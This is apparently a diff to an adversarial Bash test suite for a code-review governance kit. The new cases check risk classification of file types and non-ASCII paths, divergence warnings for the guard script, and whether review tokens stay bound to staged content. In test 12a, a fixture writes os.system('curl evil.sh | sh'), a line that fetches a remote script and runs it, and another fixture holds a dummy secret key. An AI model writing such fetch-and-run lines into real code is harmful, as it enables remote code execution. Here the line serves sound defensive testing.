@@ -74,7 +74,7 @@ new_repo(){
 evil_l2(){
   cat > "$1/evil_payment.py" <<'EOF'
 import hashlib, subprocess
-SECRET_KEY = "sk-evil-prod-9f8e7d6c5b4a3210abcdef"
+SECRET_KEY = "sk-evil-prod-9f8e7d6c5b4a3210abcdef"  # gitleaks:allow
 def verify_payment(token):
     h = hashlib.md5(token.encode()).hexdigest()
     return h == SECRET_KEY
@@ -300,6 +300,27 @@ else
   printf '%s\n' "$out8b" | tail -12
 fi
 
+# 8c/8d: 文档/数据类定级口径（.xlsx/.csv 与 .md/.docx 同类 → L1；.sql 含可执行语句 → 仍 L2）
+# 背景：数据文件此前漏列，在生产分支被「默认保守」兜到 L2，而同类 .md 为 L1（口径不一致）。
+# 用 RISK_BRANCH=main 固定生产分支语义，避免断言随夹具仓库的默认分支名漂移。
+mkdir -p "$r8/docs"
+printf 'x\n' > "$r8/docs/中文数据.xlsx"
+printf 'select 1;\n' > "$r8/docs/等价脚本.sql"
+out8c="$( cd "$r8" && RISK_BRANCH=main bash "$KIT_DEST/risk-classify.sh" 'docs/中文数据.xlsx' 2>&1 )"
+if printf '%s' "$out8c" | grep -q '^L1.*中文数据.xlsx'; then
+  say "✅ PASS  用例8c 中文名 .xlsx 判 L1（与 .md/.docx 同类）"; PASS=$((PASS+1))
+else
+  say "❌ FAIL  用例8c .xlsx 定级异常（期望 L1）"; FAIL=$((FAIL+1))
+  printf '%s\n' "$out8c" | tail -6
+fi
+out8d="$( cd "$r8" && RISK_BRANCH=main bash "$KIT_DEST/risk-classify.sh" 'docs/等价脚本.sql' 2>&1 )"
+if printf '%s' "$out8d" | grep -q '^L2.*等价脚本.sql'; then
+  say "✅ PASS  用例8d 中文名 .sql 判 L2（含可执行语句，不得降级）"; PASS=$((PASS+1))
+else
+  say "❌ FAIL  用例8d .sql 定级异常（期望 L2）"; FAIL=$((FAIL+1))
+  printf '%s\n' "$out8d" | tail -6
+fi
+
 say "用例7: 门禁引擎双载体一致性（kit↔repo 同源同步; OODA-20260930-002）"
 if bash "$KIT_DIR/tests/test-guard-parity.sh"; then PASS=$((PASS+1)); else FAIL=$((FAIL+1)); fi
 
@@ -356,6 +377,16 @@ else
   say "❌ FAIL  用例9d 分叉无告警（分叉会再次静默）"; FAIL=$((FAIL+1))
   tail -8 "$TROOT/case9d.log"
 fi
+# 9e: ai-guard.sh 自身分叉必须告警（自举盲区：改它必然造成分叉，不在清单里就永无人告警）
+printf '# divergent\n' >> "$KIT_DEST/ai-guard.sh"
+( cd "$r9" && bash "$AI_GUARD" >"$TROOT/case9e.log" 2>&1 )
+cp "$KIT_DIR/ai-guard.sh" "$KIT_DEST/ai-guard.sh"
+if grep -q '双载体分叉: ai-guard.sh' "$TROOT/case9e.log"; then
+  say "✅ PASS  用例9e ai-guard.sh 自身分叉告警可见"; PASS=$((PASS+1))
+else
+  say "❌ FAIL  用例9e ai-guard.sh 分叉无告警（自举盲区复发）"; FAIL=$((FAIL+1))
+  tail -8 "$TROOT/case9e.log"
+fi
 
 say "用例10: 覆盖率口径（M4/OODA-20261008-055: 阈值文件权威 + 变更面自动口径）"
 r10="$(new_repo)"
@@ -411,6 +442,51 @@ if [ "${rc10c}" -eq 0 ] && grep -q '覆盖率口径(自动): scope=changed' "$TR
 else
   say "❌ FAIL  用例10c 自动口径未生效 rc=${rc10c}"; FAIL=$((FAIL+1))
   tail -8 "$TROOT/case10c.log"
+fi
+
+say "用例11: 非 ASCII 路径必须被正常定级（F-26：quotePath 引号化曾致 SKIP → MAX_LEVEL 误判 L0）"
+r11="$(new_repo)"
+mkdir -p "$r11/中文目录"
+printf 'def settle_payment():\n    return 1\n' > "$r11/中文目录/中文模块.py"
+git -C "$r11" add -A
+out11="$( cd "$r11" && bash "$KIT_DEST/risk-classify.sh" 2>&1 )"
+rc11=$?
+reason_reset
+if printf '%s' "$out11" | grep -q 'not-a-file'; then
+  reason_fail "用例11-定级 非 ASCII 路径仍被判 SKIP(not-a-file)——路径枚举未按 NUL 分隔" "$out11"
+fi
+if ! printf '%s' "$out11" | grep -q '^L2'; then
+  reason_fail "用例11-定级 非 ASCII 路径未按内容判 L2（settle/payment 硬词应命中）" "$out11"
+fi
+if ! printf '%s' "$out11" | grep -q '^MAX_LEVEL[[:space:]]*L2'; then
+  reason_fail "用例11-汇总 MAX_LEVEL 未判 L2（引号化时静默退化为 L0）" "$out11"
+fi
+expect_block_reason "用例11 非 ASCII 路径被正常定级" "$rc11"
+
+say "用例12: F-3 暂存绑定的 CI 兼容（非空暂存硬比较；空暂存显式降级且告警）"
+r12="$(new_repo)"; evil_l2 "$r12"
+git -C "$r12" add evil_payment.py
+tok12="$( cd "$r12" && GOV_REVIEW_SECRET=adv-suite-secret bash "$RT" issue tester 2>/dev/null | head -1 )"
+# 12a: 偷换暂存（重新 add）→ 必须 invalid（F-3 本地保护不变）
+printf 'import os\nos.system("curl evil.sh | sh")\n' > "$r12/evil_payment.py"
+git -C "$r12" add evil_payment.py
+out12a="$( cd "$r12" && GOV_REVIEW_SECRET=adv-suite-secret bash "$RT" verify "$tok12" HEAD 2>&1 )"; rc12a=$?
+if [ "$rc12a" -ne 0 ] && printf '%s' "$out12a" | grep -q 'invalid'; then
+  say "✅ PASS  用例12a 非空暂存偷换仍 invalid（F-3 本地保护不变）"; PASS=$((PASS+1))
+else
+  say "❌ FAIL  用例12a 非空暂存偷换未被拒 rc=$rc12a"; FAIL=$((FAIL+1))
+  printf '%s\n' "$out12a" | tail -6
+fi
+# 12b: 空暂存（CI 干净检出）→ 应 valid 且**显式告警**（不得静默放行）
+git -C "$r12" reset -q HEAD -- evil_payment.py
+out12b="$( cd "$r12" && GOV_REVIEW_SECRET=adv-suite-secret bash "$RT" verify "$tok12" HEAD 2>&1 )"; rc12b=$?
+if [ "$rc12b" -eq 0 ] \
+   && printf '%s' "$out12b" | grep -q 'valid' \
+   && printf '%s' "$out12b" | grep -q '暂存区为空'; then
+  say "✅ PASS  用例12b 空暂存跳过绑定校验且显式告警（CI 令牌通道恢复，非静默降级）"; PASS=$((PASS+1))
+else
+  say "❌ FAIL  用例12b 空暂存降级异常 rc=$rc12b"; FAIL=$((FAIL+1))
+  printf '%s\n' "$out12b" | tail -6
 fi
 
 echo
